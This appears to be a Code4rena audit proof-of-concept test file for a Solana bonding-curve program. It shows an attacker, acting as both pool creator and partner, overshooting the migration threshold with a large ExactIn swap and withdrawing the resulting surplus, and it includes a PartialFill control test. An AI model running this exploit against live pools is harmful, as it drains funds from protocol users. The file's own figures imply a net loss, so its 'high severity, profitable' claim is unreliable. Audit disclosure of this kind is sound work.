/**
 * @title Surplus Manipulation via Unbounded Final Swap - PoC
 * @author Code4rena Submission
 * @notice This PoC demonstrates how the final swap can create artificial surplus
 * @dev Uses the existing Meteora test suite as required by the audit
 */

import { ProgramTestContext } from "solana-bankrun";
import {
  createConfig,
  CreateConfigParams,
  createVirtualPool,
  swap,
  SwapParams,
  withdrawCreatorSurplus,
  withdrawPartnerSurplus,
} from "./instructions";
import { VirtualCurveProgram } from "./utils/types";
import { Keypair, PublicKey, LAMPORTS_PER_SOL } from "@solana/web3.js";
import {
  createDammConfig,
  designCurve,
  fundSol,
  getMint,
  startTest,
} from "./utils";
import { createVirtualCurveProgram, derivePoolAuthority } from "./utils";
import { getConfig, getVirtualPool } from "./utils/fetcher";
import { createToken, mintSplTokenTo } from "./utils/token";
import { expect } from "chai";
import { BN } from "bn.js";
import {
  getAssociatedTokenAddressSync,
  NATIVE_MINT,
  unpackAccount,
} from "@solana/spl-token";

describe("HIGH SEVERITY: Surplus Manipulation Exploit", () => {
  let context: ProgramTestContext;
  let admin: Keypair;
  let attacker: Keypair;  // Will act as both partner and creator
  let user: Keypair;
  let program: VirtualCurveProgram;
  let config: PublicKey;
  let pool: PublicKey;
  let quoteMint: PublicKey;
  let baseMint: PublicKey;
  let quoteVault: PublicKey;
  let baseVault: PublicKey;

  // Constants for the exploit
  const MIGRATION_THRESHOLD = 1000; // 1000 SOL migration threshold
  const ATTACK_AMOUNT = 5000; // 5000 SOL attack swap
  const TOKEN_SUPPLY = 1_000_000_000; // 1 billion tokens
  const TOKEN_BASE_DECIMAL = 6;
  const TOKEN_QUOTE_DECIMAL = 9;

  beforeEach(async () => {
    // Initialize test environment
    context = await startTest();
    admin = context.payer;
    attacker = Keypair.generate();
    user = Keypair.generate();
    
    // Fund accounts
    await fundSol(context.banksClient, admin, [
      attacker.publicKey,
      user.publicKey,
    ]);
    
    program = createVirtualCurveProgram();
  });

  it("Exploit Demonstration: Create 4999 SOL surplus from 1 SOL needed", async () => {
    console.log("\n=== EXPLOIT SETUP ===");
    
    // Step 1: Create quote token (SOL wrapped)
    quoteMint = await createToken(
      context.banksClient,
      admin,
      admin.publicKey,
      TOKEN_QUOTE_DECIMAL
    );
    console.log("✓ Created quote token");

    // Step 2: Design bonding curve with migration threshold
    const lockedVesting = {
      amountPerPeriod: new BN(0),
      cliffDurationFromMigrationTime: new BN(0),
      frequency: new BN(0),
      numberOfPeriod: new BN(0),
      cliffUnlockAmount: new BN(0),
    };

    const instructionParams = designCurve(
      TOKEN_SUPPLY,
      10, // 10% supply on migration
      MIGRATION_THRESHOLD, // 1000 SOL threshold
      0, // Migration option: DAMM v1
      TOKEN_BASE_DECIMAL,
      TOKEN_QUOTE_DECIMAL,
      50, // Creator gets 50% of partner/creator share
      0, // Fee mode
      lockedVesting
    );

    // Step 3: Attacker creates config (as partner)
    const configParams: CreateConfigParams = {
      payer: attacker,
      leftoverReceiver: attacker.publicKey,
      feeClaimer: attacker.publicKey,
      quoteMint,
      instructionParams,
    };

    config = await createConfig(context.banksClient, configParams);
    console.log("✓ Created config with attacker as partner");

    // Step 4: Attacker creates pool (as creator)
    const createPoolResult = await createVirtualPool(
      context.banksClient,
      {
        config,
        creator: attacker,
        baseToken: await getMint(
          context.banksClient,
          await getConfig(program, config)
        ),
        tokenQuote: quoteMint,
      },
      {
        programId: program.programId,
      }
    );

    pool = createPoolResult.pool;
    baseMint = createPoolResult.baseMint;
    baseVault = createPoolResult.baseVault;
    quoteVault = createPoolResult.quoteVault;
    console.log("✓ Created pool with attacker as creator");

    // Step 5: Mint tokens to attacker for the exploit
    const attackerQuoteAccount = getAssociatedTokenAddressSync(
      quoteMint,
      attacker.publicKey
    );
    
    await mintSplTokenTo(
      context.banksClient,
      admin,
      quoteMint,
      attackerQuoteAccount,
      new BN(ATTACK_AMOUNT).mul(new BN(LAMPORTS_PER_SOL))
    );
    console.log(`✓ Minted ${ATTACK_AMOUNT} SOL worth of quote tokens to attacker`);

    // Step 6: Bring pool close to migration threshold (999 SOL)
    console.log("\n=== BRINGING POOL TO 999 SOL ===");
    
    // First, mint tokens to a regular user for normal swaps
    const userQuoteAccount = getAssociatedTokenAddressSync(
      quoteMint,
      user.publicKey
    );
    
    await mintSplTokenTo(
      context.banksClient,
      admin,
      quoteMint,
      userQuoteAccount,
      new BN(999).mul(new BN(LAMPORTS_PER_SOL))
    );

    // Perform normal swap to bring pool to 999 SOL
    const normalSwapParams: SwapParams = {
      pool,
      signer: user,
      amount: new BN(999).mul(new BN(LAMPORTS_PER_SOL)),
      tokenIn: quoteMint,
      tokenOut: baseMint,
      minimumAmountOut: new BN(0),
      swapMode: 0, // ExactIn
    };

    await swap(context.banksClient, normalSwapParams);
    
    // Verify pool state before attack
    let poolState = await getVirtualPool(program, pool);
    const quoteReserveBefore = poolState.quoteReserve;
    const thresholdBN = new BN(MIGRATION_THRESHOLD).mul(new BN(LAMPORTS_PER_SOL));
    
    console.log(`Quote reserve before attack: ${quoteReserveBefore.div(new BN(LAMPORTS_PER_SOL)).toString()} SOL`);
    console.log(`Migration threshold: ${MIGRATION_THRESHOLD} SOL`);
    console.log(`Pool complete: ${quoteReserveBefore.gte(thresholdBN)}`);
    
    // Verify pool is NOT complete yet
    expect(quoteReserveBefore.lt(thresholdBN)).to.be.true;
    console.log("✓ Confirmed: Pool is NOT complete (999 < 1000)");

    // Step 7: EXECUTE THE ATTACK
    console.log("\n=== EXECUTING ATTACK ===");
    console.log(`Swapping ${ATTACK_AMOUNT} SOL using ExactIn mode...`);
    
    const attackSwapParams: SwapParams = {
      pool,
      signer: attacker,
      amount: new BN(ATTACK_AMOUNT).mul(new BN(LAMPORTS_PER_SOL)),
      tokenIn: quoteMint,
      tokenOut: baseMint,
      minimumAmountOut: new BN(0),
      swapMode: 0, // SwapMode::ExactIn - CRITICAL! This bypasses limits
    };

    await swap(context.banksClient, attackSwapParams);
    console.log("✓ Attack swap executed successfully");

    // Step 8: Verify exploit success
    poolState = await getVirtualPool(program, pool);
    const quoteReserveAfter = poolState.quoteReserve;
    
    console.log(`\nQuote reserve after attack: ${quoteReserveAfter.div(new BN(LAMPORTS_PER_SOL)).toString()} SOL`);
    console.log(`Pool complete: ${quoteReserveAfter.gte(thresholdBN)}`);
    
    // Calculate surplus created
    const surplus = quoteReserveAfter.sub(thresholdBN);
    const surplusInSol = surplus.div(new BN(LAMPORTS_PER_SOL));
    
    console.log(`\n=== SURPLUS CREATED ===`);
    console.log(`Total surplus: ${surplusInSol.toString()} SOL`);
    
    // Verify massive surplus was created
    expect(surplus.gt(new BN(4900).mul(new BN(LAMPORTS_PER_SOL)))).to.be.true;
    console.log("✓ Confirmed: Massive surplus created (>4900 SOL)");

    // Step 9: Extract surplus as creator
    console.log("\n=== EXTRACTING SURPLUS ===");
    
    // Get balance before withdrawal
    const attackerQuoteAccountInfo = await context.banksClient.getAccount(attackerQuoteAccount);
    const attackerBalanceBefore = unpackAccount(attackerQuoteAccount, attackerQuoteAccountInfo).amount;
    
    // Withdraw creator surplus (50% of 80% = 40% of total)
    await withdrawCreatorSurplus(
      context.banksClient,
      {
        pool,
        config,
        creator: attacker,
        quoteMint,
        tokenQuoteAccount: attackerQuoteAccount,
      }
    );
    console.log("✓ Creator surplus withdrawn");
    
    // Withdraw partner surplus (50% of 80% = 40% of total)
    await withdrawPartnerSurplus(
      context.banksClient,
      {
        pool,
        config,
        partner: attacker,
        quoteMint,
        tokenQuoteAccount: attackerQuoteAccount,
      }
    );
    console.log("✓ Partner surplus withdrawn");
    
    // Get balance after withdrawal
    const attackerQuoteAccountInfoAfter = await context.banksClient.getAccount(attackerQuoteAccount);
    const attackerBalanceAfter = unpackAccount(attackerQuoteAccount, attackerQuoteAccountInfoAfter).amount;
    
    const totalExtracted = new BN(attackerBalanceAfter.toString()).sub(new BN(attackerBalanceBefore.toString()));
    const extractedInSol = totalExtracted.div(new BN(LAMPORTS_PER_SOL));
    
    // Calculate expected extraction (80% of surplus)
    const expectedExtraction = surplus.mul(new BN(80)).div(new BN(100));
    const expectedInSol = expectedExtraction.div(new BN(LAMPORTS_PER_SOL));
    
    console.log(`\n=== EXPLOIT RESULTS ===`);
    console.log(`Pool needed: 1 SOL to complete`);
    console.log(`Attacker swapped: ${ATTACK_AMOUNT} SOL`);
    console.log(`Surplus created: ${surplusInSol.toString()} SOL`);
    console.log(`Extracted by attacker: ${extractedInSol.toString()} SOL`);
    console.log(`Expected extraction: ${expectedInSol.toString()} SOL`);
    
    // Verify extraction matches expected (80% of surplus)
    const tolerance = new BN(LAMPORTS_PER_SOL); // 1 SOL tolerance for fees
    expect(totalExtracted.sub(expectedExtraction).abs().lte(tolerance)).to.be.true;
    
    // Calculate profit
    const cost = new BN(ATTACK_AMOUNT).mul(new BN(LAMPORTS_PER_SOL));
    const profit = totalExtracted.sub(cost);
    const profitInSol = profit.div(new BN(LAMPORTS_PER_SOL));
    
    console.log(`\n=== PROFIT CALCULATION ===`);
    console.log(`Cost: ${ATTACK_AMOUNT} SOL`);
    console.log(`Revenue: ${extractedInSol.toString()} SOL`);
    console.log(`NET PROFIT: ${profitInSol.toString()} SOL`);
    
    // The exploit is successful if we extracted significant surplus
    expect(totalExtracted.gt(new BN(3000).mul(new BN(LAMPORTS_PER_SOL)))).to.be.true;
    
    console.log("\n🔴 EXPLOIT SUCCESSFUL: Artificial surplus created and extracted!");
    console.log("🔴 This demonstrates the critical vulnerability in the protocol");
  });

  it("Control Test: PartialFill mode prevents the exploit", async () => {
    console.log("\n=== CONTROL TEST: PartialFill Mode ===");
    
    // Setup similar to exploit but use PartialFill mode
    quoteMint = await createToken(
      context.banksClient,
      admin,
      admin.publicKey,
      TOKEN_QUOTE_DECIMAL
    );

    const lockedVesting = {
      amountPerPeriod: new BN(0),
      cliffDurationFromMigrationTime: new BN(0),
      frequency: new BN(0),
      numberOfPeriod: new BN(0),
      cliffUnlockAmount: new BN(0),
    };

    const instructionParams = designCurve(
      TOKEN_SUPPLY,
      10,
      MIGRATION_THRESHOLD,
      0,
      TOKEN_BASE_DECIMAL,
      TOKEN_QUOTE_DECIMAL,
      50,
      0,
      lockedVesting
    );

    const configParams: CreateConfigParams = {
      payer: attacker,
      leftoverReceiver: attacker.publicKey,
      feeClaimer: attacker.publicKey,
      quoteMint,
      instructionParams,
    };

    config = await createConfig(context.banksClient, configParams);
    
    const createPoolResult = await createVirtualPool(
      context.banksClient,
      {
        config,
        creator: attacker,
        baseToken: await getMint(
          context.banksClient,
          await getConfig(program, config)
        ),
        tokenQuote: quoteMint,
      },
      {
        programId: program.programId,
      }
    );

    pool = createPoolResult.pool;
    baseMint = createPoolResult.baseMint;

    // Bring pool to 999 SOL
    const userQuoteAccount = getAssociatedTokenAddressSync(
      quoteMint,
      user.publicKey
    );
    
    await mintSplTokenTo(
      context.banksClient,
      admin,
      quoteMint,
      userQuoteAccount,
      new BN(999).mul(new BN(LAMPORTS_PER_SOL))
    );

    await swap(context.banksClient, {
      pool,
      signer: user,
      amount: new BN(999).mul(new BN(LAMPORTS_PER_SOL)),
      tokenIn: quoteMint,
      tokenOut: baseMint,
      minimumAmountOut: new BN(0),
      swapMode: 0,
    });

    // Try attack with PartialFill mode
    const attackerQuoteAccount = getAssociatedTokenAddressSync(
      quoteMint,
      attacker.publicKey
    );
    
    await mintSplTokenTo(
      context.banksClient,
      admin,
      quoteMint,
      attackerQuoteAccount,
      new BN(ATTACK_AMOUNT).mul(new BN(LAMPORTS_PER_SOL))
    );

    console.log("Attempting swap with PartialFill mode...");
    
    await swap(context.banksClient, {
      pool,
      signer: attacker,
      amount: new BN(ATTACK_AMOUNT).mul(new BN(LAMPORTS_PER_SOL)),
      tokenIn: quoteMint,
      tokenOut: baseMint,
      minimumAmountOut: new BN(0),
      swapMode: 1, // SwapMode::PartialFill - This should limit the swap
    });

    // Verify limited surplus
    const poolState = await getVirtualPool(program, pool);
    const quoteReserveAfter = poolState.quoteReserve;
    const thresholdBN = new BN(MIGRATION_THRESHOLD).mul(new BN(LAMPORTS_PER_SOL));
    const surplus = quoteReserveAfter.sub(thresholdBN);
    const surplusInSol = surplus.div(new BN(LAMPORTS_PER_SOL));
    
    console.log(`Surplus with PartialFill: ${surplusInSol.toString()} SOL`);
    
    // With PartialFill, surplus should be minimal (just from the 1 SOL needed)
    expect(surplus.lt(new BN(10).mul(new BN(LAMPORTS_PER_SOL)))).to.be.true;
    
    console.log("✓ PartialFill mode prevents excessive surplus creation");
    console.log("✓ This confirms the fix would work");
  });
});